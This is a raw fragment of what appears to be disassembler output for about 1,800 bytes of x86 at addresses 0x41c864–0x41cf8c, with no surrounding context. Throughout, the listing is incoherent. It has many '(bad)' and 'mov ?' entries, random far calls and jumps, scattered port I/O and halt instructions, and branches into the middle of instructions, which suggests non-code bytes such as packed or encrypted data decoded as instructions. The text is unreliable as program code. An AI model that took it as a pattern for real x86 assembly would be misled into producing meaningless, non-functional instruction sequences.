  41c864:	popf   
  41c865:	lock dec eax
  41c867:	shr    DWORD PTR [ebp+0x13],0xee
  41c86b:	and    esi,DWORD PTR [eax]
  41c86d:	cs sbb edx,edx
  41c870:	xchg   ecx,eax
  41c871:	into   
  41c872:	sbb    eax,0xa825b54
  41c877:	fcomp  QWORD PTR [ebx+ecx*2-0x4a2aa4b1]
  41c87e:	inc    BYTE PTR [edx+edx*1-0x3af6e628]
  41c885:	push   ss
  41c886:	cmp    al,0xf6
  41c888:	jne    0x41c88b
  41c88a:	shl    DWORD PTR [eax+0x45b74f96],cl
  41c890:	ins    BYTE PTR es:[edi],dx
  41c891:	mov    ebx,0x22c14cc3
  41c896:	cmovg  eax,DWORD PTR [ecx+0x6c]
  41c89a:	and    eax,0x528005bd
  41c89f:	in     eax,dx
  41c8a0:	(bad)  
  41c8a1:	and    BYTE PTR es:[ecx],0x59
  41c8a5:	mov    dl,cl
  41c8a7:	sar    BYTE PTR [edi-0x3b],cl
  41c8aa:	lds    ecx,FWORD PTR [ecx-0x8984152]
  41c8b0:	jecxz  0x41c8be
  41c8b2:	and    eax,0x3795e0d4
  41c8b7:	or     BYTE PTR [eax+0x7baea182],0x7e
  41c8be:	std    
  41c8bf:	outs   dx,DWORD PTR ds:[esi]
  41c8c0:	nop
  41c8c1:	stc    
  41c8c2:	and    edx,DWORD PTR [ebx]
  41c8c4:	add    edi,DWORD PTR [eax+0x7b5c39e4]
  41c8ca:	test   BYTE PTR [eax+0x2e51a18f],bl
  41c8d0:	call   0xd9ff:0x8ae997d6
  41c8d7:	lds    ecx,FWORD PTR [edx+0x48]
  41c8da:	xchg   esp,eax
  41c8db:	xor    eax,0xc54de151
  41c8e0:	daa    
  41c8e1:	scas   eax,DWORD PTR es:[edi]
  41c8e2:	adc    BYTE PTR [ecx+0x44],bh
  41c8e5:	sub    eax,0x6d3e7f0c
  41c8ea:	add    BYTE PTR [edx+0x79],cl
  41c8ed:	push   ebp
  41c8ee:	add    edi,DWORD PTR [edi-0x7b]
  41c8f1:	pushf  
  41c8f2:	push   es
  41c8f3:	push   ebx
  41c8f4:	cmp    DWORD PTR [ebp-0x3d01ba3b],0x30
  41c8fb:	add    al,0xc8
  41c8fd:	push   0x8487252f
  41c902:	and    eax,0xe828502b
  41c907:	or     cl,BYTE PTR [edi-0x6e]
  41c90a:	sub    bh,BYTE PTR [eax]
  41c90c:	in     al,0x16
  41c90e:	call   0x1b6b:0x91bfa99c
  41c915:	jbe    0x41c8f3
  41c917:	popa   
  41c918:	test   eax,0x41572c61
  41c91d:	fadd   QWORD PTR [edx]
  41c91f:	ja     0x41c944
  41c921:	ins    DWORD PTR es:[edi],dx
  41c922:	retf   
  41c923:	and    al,0xf4
  41c925:	lea    ebp,[eax-0x55]
  41c928:	aas    
  41c929:	ret    
  41c92a:	push   ebx
  41c92b:	loop   0x41c8de
  41c92d:	jmp    0x41c9a9
  41c92f:	loope  0x41c8d5
  41c931:	and    dl,0x8d
  41c934:	and    al,0x75
  41c936:	push   eax
  41c937:	jp     0x41c8dc
  41c939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c93a:	push   ebp
  41c93b:	iret   
  41c93c:	outs   dx,DWORD PTR ds:[esi]
  41c93d:	and    cl,bl
  41c93f:	xchg   esi,eax
  41c940:	out    0xda,al
  41c942:	hlt    
  41c943:	mov    eax,0x8dfa7559
  41c948:	inc    ebx
  41c949:	jecxz  0x41c9c0
  41c94b:	call   0x1f8fe7df
  41c950:	or     eax,0x3dfd2b16
  41c955:	outs   dx,DWORD PTR ds:[esi]
  41c956:	fs xor eax,0x4818e2cb
  41c95c:	in     eax,dx
  41c95d:	dec    eax
  41c95e:	jo     0x41c9d3
  41c960:	sti    
  41c961:	inc    edx
  41c962:	test   al,dh
  41c964:	mov    DWORD PTR [esi-0x58f55c8c],ebp
  41c96a:	ror    DWORD PTR [ebx+0x53ff4962],cl
  41c970:	mov    dl,BYTE PTR [esi+0x7745b81d]
  41c976:	dec    ebx
  41c977:	fsubr  DWORD PTR [ebx]
  41c979:	mov    al,dh
  41c97b:	scas   eax,DWORD PTR es:[edi]
  41c97c:	xchg   DWORD PTR [eax],esp
  41c97e:	stc    
  41c97f:	inc    edx
  41c980:	test   DWORD PTR [edx+0x2af0d52f],eax
  41c986:	pop    ecx
  41c987:	and    eax,0x38d07f7
  41c98c:	in     al,0x7c
  41c98e:	mov    dh,0x32
  41c990:	shl    ch,cl
  41c992:	dec    edi
  41c993:	jns    0x41c9a4
  41c995:	in     eax,dx
  41c996:	mov    ds:0xb48731c3,al
  41c99b:	clc    
  41c99c:	loopne 0x41c928
  41c99e:	je     0x41c9fc
  41c9a0:	push   edx
  41c9a1:	jge    0x41ca0f
  41c9a3:	pusha  
  41c9a4:	xchg   ecx,eax
  41c9a5:	adc    al,0x2b
  41c9a7:	jecxz  0x41c9e3
  41c9a9:	mov    esp,edi
  41c9ab:	aad    0x2a
  41c9ad:	xchg   ebp,eax
  41c9ae:	fbld   TBYTE PTR [edx]
  41c9b0:	pop    es
  41c9b1:	xchg   ebx,eax
  41c9b2:	in     eax,dx
  41c9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9b4:	dec    edx
  41c9b5:	addr16 test eax,0xa5257c7b
  41c9bb:	cmp    BYTE PTR [eax+ebx*2+0x2b],dl
  41c9bf:	(bad)  
  41c9c0:	inc    ebp
  41c9c1:	mov    ecx,0x8b25d76b
  41c9c6:	pop    edi
  41c9c7:	xor    esp,DWORD PTR [eax]
  41c9c9:	jge    0x41c97f
  41c9cb:	xchg   esp,eax
  41c9cc:	jg     0x41c9b5
  41c9ce:	clc    
  41c9cf:	iret   
  41c9d0:	dec    esp
  41c9d1:	and    eax,0xbcc698ab
  41c9d6:	and    DWORD PTR [ebp+0x36],ecx
  41c9d9:	fstp   st(3)
  41c9db:	cmp    al,0xba
  41c9dd:	(bad)  
  41c9de:	cmp    dl,BYTE PTR [edx]
  41c9e0:	out    0xc,al
  41c9e2:	loopne 0x41c9d5
  41c9e4:	scas   al,BYTE PTR es:[edi]
  41c9e5:	fmul   QWORD PTR [edi+eax*8+0x78d2452c]
  41c9ec:	sbb    BYTE PTR [ecx-0x31d89ac8],ah
  41c9f2:	gs out dx,al
  41c9f4:	je     0x41c9c5
  41c9f6:	mov    al,ds:0xe6fa65b8
  41c9fb:	or     DWORD PTR [eax],edx
  41c9fd:	sub    edx,DWORD PTR [eax+0xb]
  41ca00:	mov    al,ds:0x62498a6d
  41ca05:	or     DWORD PTR [esp+edx*2-0x2c],esi
  41ca09:	inc    esi
  41ca0a:	jbe    0x41c9df
  41ca0c:	mov    gs,WORD PTR [esi-0x6c]
  41ca0f:	push   edx
  41ca10:	in     eax,0x38
  41ca12:	pop    esi
  41ca13:	jmp    0x2987dd7
  41ca18:	mov    ebx,0xe9ba5985
  41ca1d:	nop
  41ca1e:	push   0x6d4d91af
  41ca23:	gs adc eax,0x135ffbdb
  41ca29:	dec    esi
  41ca2a:	nop
  41ca2b:	mov    ds:0x8a7b3e28,al
  41ca30:	out    0x74,eax
  41ca32:	dec    edx
  41ca33:	jb     0x41c9d6
  41ca35:	les    edi,FWORD PTR [esi-0x42]
  41ca38:	scas   al,BYTE PTR es:[di]
  41ca3a:	mov    esp,0x29fe0dd4
  41ca3f:	pop    esi
  41ca40:	sbb    esi,eax
  41ca42:	inc    edi
  41ca43:	xor    dl,bh
  41ca45:	mov    si,cx
  41ca48:	popa   
  41ca49:	loop   0x41ca5c
  41ca4b:	mov    dl,0xe4
  41ca4d:	repnz arpl WORD PTR [ecx],dx
  41ca50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca51:	stc    
  41ca52:	pop    ebx
  41ca53:	mov    al,dl
  41ca55:	aas    
  41ca56:	ins    DWORD PTR es:[edi],dx
  41ca57:	fisub  DWORD PTR ds:0xfce82cb9
  41ca5d:	and    eax,0x41536ac6
  41ca62:	mov    ?,WORD PTR [edx+0x67]
  41ca65:	int3   
  41ca66:	pop    ebp
  41ca67:	repnz jecxz 0x41ca3a
  41ca6a:	xchg   esi,eax
  41ca6b:	push   cs
  41ca6c:	push   es
  41ca6d:	les    eax,FWORD PTR [ebx-0x1682f844]
  41ca73:	mov    bh,0x79
  41ca75:	adc    al,0x2c
  41ca77:	test   al,0x98
  41ca79:	call   0x5c374a44
  41ca7e:	lahf   
  41ca7f:	mov    dh,0xe9
  41ca81:	and    al,bl
  41ca83:	pushf  
  41ca84:	pop    edi
  41ca85:	sbb    dl,BYTE PTR [eax-0xb61206b]
  41ca8b:	xor    eax,0x46be3f65
  41ca90:	(bad)  
  41ca91:	cld    
  41ca92:	push   edi
  41ca93:	bound  ecx,QWORD PTR [eax]
  41ca95:	mov    bl,0xc6
  41ca97:	call   0x2840:0xb0e61e7d
  41ca9e:	mov    eax,0xd3d34386
  41caa3:	fs adc eax,0x661d6cd8
  41caa9:	popa   
  41caaa:	inc    edx
  41caab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41caac:	xor    ebp,DWORD PTR [edi-0x63a9284e]
  41cab2:	lds    edi,FWORD PTR [edi+0x66]
  41cab5:	mov    esi,0x7ae56b58
  41caba:	lea    ebx,[ebp+edi*1-0x5a2d16dc]
  41cac1:	(bad)  
  41cac2:	in     al,0x79
  41cac4:	call   0x6d3a:0x4430ca9f
  41cacb:	push   eax
  41cacc:	pop    edi
  41cacd:	scas   eax,DWORD PTR es:[edi]
  41cace:	adc    ecx,ebx
  41cad0:	cmp    al,0x40
  41cad2:	sub    BYTE PTR [ecx+eiz*8],bh
  41cad5:	out    0xa2,al
  41cad7:	sar    BYTE PTR [eax+0x4c],cl
  41cada:	add    dl,ah
  41cadc:	xchg   ecx,eax
  41cadd:	out    dx,al
  41cade:	add    al,0x52
  41cae0:	dec    ecx
  41cae1:	sti    
  41cae2:	ret    0xf830
  41cae5:	test   ebx,ebp
  41cae7:	sbb    eax,0x9b9c4da9
  41caec:	adc    ah,dl
  41caee:	or     BYTE PTR [edi+0x52],al
  41caf1:	push   0xffffffec
  41caf3:	and    eax,0xa7d54eb2
  41caf8:	adc    DWORD PTR [ebp+0x3731a413],edx
  41cafe:	mov    bh,0x59
  41cb00:	xchg   edx,eax
  41cb01:	push   0x7b
  41cb03:	ins    BYTE PTR es:[edi],dx
  41cb04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb05:	dec    esp
  41cb06:	fld    TBYTE PTR [ebp+0x61]
  41cb09:	add    BYTE PTR ss:[ebp+0x58],cl
  41cb0d:	ins    BYTE PTR es:[edi],dx
  41cb0e:	lea    edi,[ebx]
  41cb10:	imul   edi,DWORD PTR ds:[ecx+eiz*4+0x79],0xffffffec
  41cb16:	cmp    eax,0xee2b06ea
  41cb1b:	add    ebx,0xffffffac
  41cb1e:	jb     0x41cb20
  41cb20:	test   BYTE PTR [ecx+ebp*4+0x7c],dh
  41cb24:	mov    edx,DWORD PTR [eax]
  41cb26:	bound  ecx,QWORD PTR [eax]
  41cb28:	int    0xcc
  41cb2a:	fist   DWORD PTR [ebp-0x10466e01]
  41cb30:	out    dx,al
  41cb31:	outs   dx,DWORD PTR ds:[esi]
  41cb32:	loop   0x41cabf
  41cb34:	rol    BYTE PTR [eax],1
  41cb36:	xor    al,BYTE PTR [ebp+0xd286573]
  41cb3c:	mov    ch,bl
  41cb3e:	or     DWORD PTR [edx-0x3b816b48],edx
  41cb44:	inc    ecx
  41cb45:	push   ebx
  41cb46:	sbb    ah,BYTE PTR [esi+0x344b0006]
  41cb4c:	add    BYTE PTR [edi],dh
  41cb4e:	aas    
  41cb4f:	add    BYTE PTR [ebx+0x11],al
  41cb52:	(bad)  
  41cb53:	addr16 cwde 
  41cb55:	push   0xe2a496be
  41cb5a:	pushf  
  41cb5b:	ins    DWORD PTR es:[edi],dx
  41cb5c:	in     al,dx
  41cb5d:	imul   edi,edi,0x5540b98e
  41cb63:	imul   esp,ebp,0xffffff87
  41cb66:	dec    ebx
  41cb67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb68:	rcl    BYTE PTR [ebx],cl
  41cb6a:	adc    DWORD PTR [edx-0x32],esi
  41cb6d:	mov    BYTE PTR [edi+0x19c85170],dh
  41cb73:	in     eax,dx
  41cb74:	dec    ebp
  41cb75:	fcomp  DWORD PTR cs:[ebx+0x3a]
  41cb79:	pop    esi
  41cb7a:	cmp    bh,BYTE PTR [esi+0x17056b9]
  41cb80:	(bad)  
  41cb82:	loop   0x41cb5b
  41cb84:	leave  
  41cb85:	pushf  
  41cb86:	in     al,dx
  41cb87:	cmc    
  41cb88:	mov    ecx,0x4836c25f
  41cb8d:	add    edx,DWORD PTR [eax]
  41cb8f:	sbb    al,0x1c
  41cb91:	and    eax,0x793dfe08
  41cb96:	outs   dx,BYTE PTR ds:[esi]
  41cb97:	shr    BYTE PTR [ecx+0x705284dd],0x6d
  41cb9e:	inc    ecx
  41cb9f:	mov    WORD PTR [eax],?
  41cba1:	push   esi
  41cba2:	jb     0x41cbcb
  41cba4:	inc    esi
  41cba5:	ins    DWORD PTR es:[edi],dx
  41cba6:	gs jmp 0x24df:0xc58de41d
  41cbae:	loope  0x41cb80
  41cbb0:	mov    al,BYTE PTR [eax]
  41cbb2:	jle    0x41cbbf
  41cbb4:	cwde   
  41cbb5:	fs pop esi
  41cbb7:	xchg   ebx,eax
  41cbb8:	test   cl,bh
  41cbba:	adc    ecx,ebp
  41cbbc:	sahf   
  41cbbd:	mov    WORD PTR [ebx+0x3398538f],cs
  41cbc3:	mov    al,0x52
  41cbc5:	retf   0x880c
  41cbc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbc9:	mov    al,0x4b
  41cbcb:	jmp    0x5eb8:0x42768acd
  41cbd2:	jns    0x41cbec
  41cbd4:	push   ebp
  41cbd5:	dec    ebx
  41cbd6:	aaa    
  41cbd7:	inc    edi
  41cbd8:	cdq    
  41cbd9:	out    dx,al
  41cbda:	mov    al,0xef
  41cbdc:	pop    ebp
  41cbdd:	loopne 0x41cc45
  41cbdf:	or     al,0xb7
  41cbe1:	jno    0x41cc3e
  41cbe3:	popfw  
  41cbe5:	add    ebx,DWORD PTR [edx]
  41cbe7:	icebp  
  41cbe8:	test   al,0x70
  41cbea:	sub    ebp,DWORD PTR ds:0x55b57318
  41cbf0:	fst    QWORD PTR [esi+0x4f]
  41cbf3:	push   ecx
  41cbf4:	xchg   ebp,eax
  41cbf5:	adc    BYTE PTR [eax+edi*2],ch
  41cbf8:	sub    ch,BYTE PTR [eax]
  41cbfa:	mov    ?,WORD PTR [edx+0x6c4777d3]
  41cc00:	ret    
  41cc01:	jns    0x41cb88
  41cc03:	sbb    al,0xcd
  41cc05:	cwde   
  41cc06:	out    dx,eax
  41cc07:	(bad)  
  41cc08:	cmp    al,0xce
  41cc0a:	fwait
  41cc0b:	mov    ecx,0x19cd22f2
  41cc10:	add    DWORD PTR [eax],ecx
  41cc12:	ficom  WORD PTR [ebx+0xf]
  41cc15:	mov    DWORD PTR [ebp+0x36],0xec400258
  41cc1c:	es push ss
  41cc1e:	sbb    ecx,eax
  41cc20:	inc    eax
  41cc21:	cld    
  41cc22:	jmp    0xae5f:0xcf8beb6b
  41cc29:	fstp   QWORD PTR [esp+ebx*1+0x39f3eb32]
  41cc30:	add    ch,BYTE PTR [eax+eiz*2-0x5d]
  41cc34:	test   eax,0xbf639910
  41cc39:	jae    0x41cc04
  41cc3b:	mov    edx,0x6fa2678d
  41cc40:	jbe    0x41cc8c
  41cc42:	lea    eax,[ebp-0x457713d2]
  41cc48:	dec    ebx
  41cc49:	ins    DWORD PTR es:[edi],dx
  41cc4a:	sbb    BYTE PTR [ecx],cl
  41cc4c:	lods   al,BYTE PTR ds:[esi]
  41cc4d:	or     eax,0xc052bd10
  41cc52:	mov    esi,0x75e08be1
  41cc57:	(bad)  
  41cc58:	lock stos BYTE PTR es:[edi],al
  41cc5a:	lea    ecx,ds:[ebx+0x20a82644]
  41cc61:	(bad)
  41cc64:	loope  0x41ccae
  41cc66:	xchg   ebx,eax
  41cc67:	aad    0xc1
  41cc69:	pop    ecx
  41cc6a:	pop    ds
  41cc6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cc6c:	mov    ?,WORD PTR [eax+0x383c0050]
  41cc72:	loop   0x41cc17
  41cc74:	jnp    0x41ccea
  41cc76:	repnz and esp,DWORD PTR [esi+0x73]
  41cc7a:	retf   0xb736
  41cc7d:	vandnps xmm1,xmm3,XMMWORD PTR [ecx]
  41cc81:	jne    0x41cc9b
  41cc83:	aaa    
  41cc84:	lds    ebp,FWORD PTR [edi]
  41cc86:	out    dx,al
  41cc87:	std    
  41cc88:	inc    ebx
  41cc89:	fwait
  41cc8a:	scas   al,BYTE PTR es:[edi]
  41cc8b:	(bad)  
  41cc8c:	and    BYTE PTR [edx+0xe31fecd],dl
  41cc92:	pop    es
  41cc93:	inc    ecx
  41cc94:	mov    eax,0x2f52392f
  41cc99:	loop   0x41cc62
  41cc9b:	or     al,0xd8
  41cc9d:	addr16 xor ecx,esp
  41cca0:	adc    eax,0x5bc995d7
  41cca5:	js     0x41cc55
  41cca7:	xchg   esi,eax
  41cca8:	or     al,0x76
  41ccaa:	mov    WORD PTR [ebx-0x24],fs
  41ccad:	add    edi,edx
  41ccaf:	ja     0x41cd01
  41ccb1:	sbb    al,0xca
  41ccb3:	(bad)  
  41ccb4:	test   eax,0xe292939a
  41ccb9:	adc    al,0x7
  41ccbb:	xor    al,0xc4
  41ccbd:	(bad)  
  41ccbe:	cld    
  41ccbf:	inc    ebp
  41ccc0:	retf   
  41ccc1:	adc    al,0xdb
  41ccc3:	sbb    DWORD PTR [ebx+0x742e83b6],edi
  41ccc9:	mov    edx,0x9c9328b7
  41ccce:	lock ss xor ecx,0x99c0ee31
  41ccd6:	cmp    BYTE PTR [edi],dh
  41ccd8:	pop    ecx
  41ccd9:	gs call 0x3379:0x866e38ca
  41cce1:	out    0xb,eax
  41cce3:	sbb    DWORD PTR [edi],edx
  41cce5:	lods   al,BYTE PTR ds:[esi]
  41cce6:	xchg   ecx,eax
  41cce7:	enter  0x4b3d,0x1a
  41cceb:	push   ds
  41ccec:	out    0xcc,eax
  41ccee:	pop    edi
  41ccef:	(bad)  
  41ccf0:	cmc    
  41ccf1:	shr    ebp,0x8a
  41ccf4:	or     DWORD PTR [ebx+0x7],ebx
  41ccf7:	cmp    ebp,ebx
  41ccf9:	out    dx,al
  41ccfa:	add    al,0x96
  41ccfc:	dec    eax
  41ccfd:	test   eax,0x2a9fa1a2
  41cd02:	mov    ah,0xe1
  41cd04:	je     0x41cd3a
  41cd06:	pop    ebx
  41cd07:	push   esi
  41cd08:	push   edx
  41cd09:	mov    ah,0x8e
  41cd0b:	test   ecx,esi
  41cd0d:	mov    eax,ds:0xb3abe589
  41cd12:	js     0x41cd68
  41cd14:	xor    dh,BYTE PTR [edx-0x1]
  41cd17:	xchg   esp,eax
  41cd18:	xor    esi,edx
  41cd1a:	pop    ds
  41cd1b:	lea    edx,[edx+0x38]
  41cd1e:	bound  ebp,QWORD PTR [edx-0x2]
  41cd21:	adc    eax,edx
  41cd23:	leave  
  41cd24:	lock (bad) 
  41cd26:	sbb    eax,0x99ad9291
  41cd2b:	fist   DWORD PTR [ecx]
  41cd2d:	int3   
  41cd2e:	mov    ds:0xd4c22444,eax
  41cd33:	and    DWORD PTR [ebp+0x71],ebx
  41cd36:	and    ebx,ecx
  41cd38:	repz xor ebp,edx
  41cd3b:	rol    dl,0x15
  41cd3e:	cld    
  41cd3f:	push   ds
  41cd40:	add    cl,al
  41cd42:	dec    ebx
  41cd43:	sbb    eax,0x2a29ec00
  41cd48:	cmp    DWORD PTR [ebp-0x3b],edx
  41cd4b:	popa   
  41cd4c:	jmp    0x41cd3b
  41cd4e:	pop    esp
  41cd4f:	outs   dx,BYTE PTR ds:[esi]
  41cd50:	dec    ecx
  41cd51:	popa   
  41cd52:	icebp  
  41cd53:	adc    BYTE PTR [ebx],bl
  41cd55:	adc    dh,dl
  41cd57:	iret   
  41cd58:	mov    al,0xfd
  41cd5a:	in     al,dx
  41cd5b:	in     al,0xeb
  41cd5d:	nop
  41cd5e:	jmp    0x434f:0x552041c1
  41cd65:	js     0x41cd11
  41cd67:	inc    ebx
  41cd68:	retf   
  41cd69:	push   esi
  41cd6a:	mov    ds:0x245b3785,al
  41cd6f:	test   DWORD PTR [ebp-0x1319d03f],ebx
  41cd75:	ret    
  41cd76:	jmp    0x85aca23b
  41cd7b:	aad    0x55
  41cd7d:	add    al,BYTE PTR [ecx+edi*8-0x345789a9]
  41cd84:	cmp    al,0x4e
  41cd86:	(bad)  
  41cd87:	ja     0x41cd7a
  41cd89:	mov    ds:0xf4b87326,eax
  41cd8e:	push   ss
  41cd8f:	and    al,0xaa
  41cd91:	rcr    DWORD PTR [edi],cl
  41cd93:	not    DWORD PTR [ecx+0x57f0e2fe]
  41cd99:	push   edi
  41cd9a:	dec    esi
  41cd9b:	(bad)  
  41cd9c:	cmp    eax,0x5b1a8621
  41cda1:	enter  0xa484,0x20
  41cda5:	mov    esi,edx
  41cda7:	sbb    eax,0x8e475740
  41cdac:	pop    ss
  41cdad:	push   ss
  41cdae:	xor    dl,bl
  41cdb0:	sbb    al,0x1
  41cdb2:	jmp    0x41cd62
  41cdb4:	and    ah,BYTE PTR [ecx+0x74e4faa]
  41cdba:	push   cs
  41cdbb:	shl    BYTE PTR [ecx],0x51
  41cdbe:	das    
  41cdbf:	adc    eax,DWORD PTR [ebx-0x5f]
  41cdc2:	sbb    cl,bl
  41cdc4:	cmp    BYTE PTR [ebx+0x523394b5],bl
  41cdca:	push   esi
  41cdcb:	dec    esi
  41cdcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cdcd:	mov    dl,0x90
  41cdcf:	clc    
  41cdd0:	mov    BYTE PTR [eax],bl
  41cdd2:	pop    ebx
  41cdd3:	gs mov dl,0xf5
  41cdd6:	mov    ah,ch
  41cdd8:	sbb    BYTE PTR [ebp-0x50],dh
  41cddb:	ds in  eax,0xd8
  41cdde:	inc    ebx
  41cddf:	or     al,0x90
  41cde1:	(bad)  
  41cde2:	jp     0x41ce41
  41cde4:	mov    ah,0x2e
  41cde6:	pop    esp
  41cde7:	dec    eax
  41cde8:	out    0x17,eax
  41cdea:	adc    al,0x5e
  41cdec:	shl    BYTE PTR [edx+0x32],1
  41cdef:	int3   
  41cdf0:	ror    BYTE PTR [edx],1
  41cdf2:	or     bl,al
  41cdf4:	dec    esp
  41cdf5:	xor    cl,bl
  41cdf7:	sbb    ah,al
  41cdf9:	adc    DWORD PTR [eax-0x3080df7],0x6b
  41ce00:	mov    edx,0xeb41c39b
  41ce05:	sub    BYTE PTR [ebx+ebp*4+0x63b0197],ch
  41ce0c:	fsubr  st,st(6)
  41ce0e:	call   0xbf35:0x59d71faf
  41ce15:	mov    DWORD PTR ds:0xbb6bbfe2,ecx
  41ce1b:	lods   al,BYTE PTR ds:[esi]
  41ce1c:	in     al,dx
  41ce1d:	lods   al,BYTE PTR ds:[esi]
  41ce1e:	pop    edx
  41ce1f:	cwde   
  41ce20:	pop    eax
  41ce21:	aad    0x6
  41ce23:	or     al,0xdc
  41ce25:	dec    esp
  41ce26:	sbb    bl,BYTE PTR [ebx-0x61]
  41ce29:	mov    gs,WORD PTR [edi+0x70ce297e]
  41ce2f:	shr    ecx,cl
  41ce31:	fbstp  TBYTE PTR [ebx+0x7487315f]
  41ce37:	das    
  41ce38:	mov    ds:0xbc23337e,al
  41ce3d:	push   ebp
  41ce3e:	sbb    ch,ah
  41ce40:	fadd   DWORD PTR [edi-0x302e3847]
  41ce46:	sbb    eax,0x3fae29a4
  41ce4b:	loope  0x41cde0
  41ce4d:	xor    BYTE PTR [ebx],ah
  41ce4f:	cs inc esi
  41ce51:	xlat   BYTE PTR ds:[ebx]
  41ce52:	hlt    
  41ce53:	lods   al,BYTE PTR ds:[esi]
  41ce54:	jno    0x41cde2
  41ce56:	data16 outs dx,BYTE PTR ds:[esi]
  41ce58:	shl    DWORD PTR [eax],cl
  41ce5a:	out    0xfe,al
  41ce5c:	mov    ah,0x47
  41ce5e:	sbb    eax,0xf2dd90e9
  41ce63:	dec    ecx
  41ce64:	sub    eax,esi
  41ce66:	sbb    esp,DWORD PTR [edx+0x38]
  41ce69:	ja     0x41ce2c
  41ce6b:	dec    esp
  41ce6c:	shl    eax,cl
  41ce6e:	inc    ecx
  41ce6f:	dec    esi
  41ce70:	mov    ch,BYTE PTR [ebx]
  41ce72:	dec    esp
  41ce73:	jl     0x41ce9b
  41ce75:	bound  edi,QWORD PTR [edi]
  41ce77:	push   ss
  41ce78:	test   BYTE PTR [ecx+0x2a],0x87
  41ce7c:	pusha  
  41ce7d:	add    DWORD PTR [eiz*1+0x9bd2a7d],edx
  41ce84:	dec    edx
  41ce85:	xchg   edx,eax
  41ce86:	std    
  41ce87:	and    ch,cl
  41ce89:	js     0x41ce75
  41ce8b:	jmp    0xfe28:0x5024236d
  41ce92:	popa   
  41ce93:	push   ebp
  41ce94:	cld    
  41ce95:	ficomp WORD PTR [ebx-0x5a0d08d7]
  41ce9b:	std    
  41ce9c:	fcompp 
  41ce9e:	js     0x41cec5
  41cea0:	in     eax,0x83
  41cea2:	sbb    ebx,ecx
  41cea4:	scas   al,BYTE PTR es:[edi]
  41cea5:	repz jb 0x41cf26
  41cea8:	js     0x41cede
  41ceaa:	lods   eax,DWORD PTR ds:[esi]
  41ceab:	inc    eax
  41ceac:	stos   BYTE PTR es:[edi],al
  41cead:	das    
  41ceae:	jp     0x41ceff
  41ceb0:	xor    eax,0x52146bfd
  41ceb5:	inc    esp
  41ceb6:	clc    
  41ceb7:	jno    0x41ce5a
  41ceb9:	mov    esi,0x640a67af
  41cebe:	jbe    0x41cf09
  41cec0:	cld    
  41cec1:	jo     0x41cf32
  41cec3:	cdq    
  41cec4:	pop    ecx
  41cec5:	jnp    0x41cf34
  41cec7:	jnp    0x41ce7e
  41cec9:	inc    edi
  41ceca:	adc    al,0x0
  41cecc:	outs   dx,DWORD PTR ds:[esi]
  41cecd:	fiadd  WORD PTR [ecx+0x62]
  41ced0:	jmp    0x33e4afd2
  41ced5:	adc    DWORD PTR [edx+0xcda8f3c],edi
  41cedb:	pop    edi
  41cedc:	push   es
  41cedd:	nop
  41cede:	psubd  mm7,QWORD PTR fs:[edx]
  41cee2:	js     0x41cf42
  41cee4:	push   edi
  41cee5:	push   edi
  41cee6:	xchg   ebx,eax
  41cee7:	adc    al,0x33
  41cee9:	mov    esi,0x678175de
  41ceee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ceef:	call   0xfb86:0x1dd656a7
  41cef6:	adc    al,BYTE PTR [ebx+edi*2]
  41cef9:	in     eax,0xaa
  41cefb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cefc:	xlat   BYTE PTR ds:[ebx]
  41cefd:	adc    DWORD PTR [ebx+0x7d],ebx
  41cf00:	test   al,0xfe
  41cf02:	fmul   QWORD PTR [esi+0x67fc2ef3]
  41cf08:	jb     0x41cee9
  41cf0a:	bound  ebx,QWORD PTR [ebx]
  41cf0c:	(bad)  
  41cf0d:	sti    
  41cf0e:	jne    0x41cf56
  41cf10:	xchg   ebx,eax
  41cf11:	lock add al,0x48
  41cf14:	adc    DWORD PTR [esi],esi
  41cf16:	mov    edi,0x8623fdd6
  41cf1b:	cmp    BYTE PTR [ecx],ah
  41cf1d:	pop    ss
  41cf1e:	pop    esi
  41cf1f:	pop    edx
  41cf20:	js     0x41cf4c
  41cf22:	push   ss
  41cf23:	sbb    al,0x24
  41cf25:	fwait
  41cf26:	das    
  41cf27:	bound  ecx,QWORD PTR [eax]
  41cf29:	arpl   di,ax
  41cf2b:	out    dx,al
  41cf2c:	js     0x41cefd
  41cf2e:	inc    ebp
  41cf2f:	push   edi
  41cf30:	cdq    
  41cf31:	pop    ss
  41cf32:	js     0x41ced6
  41cf34:	inc    eax
  41cf35:	jmp    0x87618482
  41cf3a:	mov    BYTE PTR [edi],ch
  41cf3c:	fstp   QWORD PTR [eax-0x2a]
  41cf3f:	add    al,0xf2
  41cf41:	jo     0x41cf03
  41cf43:	les    edi,FWORD PTR [eax-0x14]
  41cf46:	sub    eax,0x2e1dde13
  41cf4b:	jmp    0x41ced4
  41cf4d:	pop    edi
  41cf4e:	imul   edx,DWORD PTR [edi+0x73],0x6f
  41cf52:	loope  0x41cfb1
  41cf54:	lahf   
  41cf55:	xor    al,0xd3
  41cf57:	adc    al,0x91
  41cf59:	cmp    edi,DWORD PTR [esi]
  41cf5b:	fwait
  41cf5c:	das    
  41cf5d:	sar    BYTE PTR [esi],cl
  41cf5f:	xlat   BYTE PTR ds:[ebx]
  41cf60:	jns    0x41cfd8
  41cf62:	pop    ds
  41cf63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf64:	adc    al,0xc8
  41cf66:	test   DWORD PTR es:[esi-0x12],eax
  41cf6a:	and    eax,0x20dd35c5
  41cf6f:	aam    0x3a
  41cf71:	inc    esi
  41cf72:	fwait
  41cf73:	and    BYTE PTR [eax],0x9
  41cf76:	and    BYTE PTR [edx+ebx*1-0x6406b319],bh
  41cf7d:	loope  0x41cfcd
  41cf7f:	lods   al,BYTE PTR ds:[esi]
  41cf80:	pop    esi
  41cf81:	add    al,0xc3
  41cf83:	stos   BYTE PTR es:[edi],al
  41cf84:	mov    esp,0xf87ddea7
  41cf89:	jnp    0x41cf29
  41cf8b:	retf   
  41cf8c:	std    
